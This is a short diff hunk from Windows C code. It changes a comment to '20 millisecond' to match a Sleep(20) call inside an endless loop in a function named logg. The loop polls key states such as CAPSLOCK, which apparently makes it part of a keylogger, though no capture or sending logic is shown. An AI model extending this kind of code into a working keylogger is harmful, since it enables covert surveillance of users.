@@ -18,7 +18,7 @@ DWORD WINAPI logg(){
 
 	//: running infinite
 	while(1){
-		//: take rest for 10 millisecond
+		//: take rest for 20 millisecond
 		Sleep(20);
 
 		//: get key state of CAPSLOCK,NUMLOCK
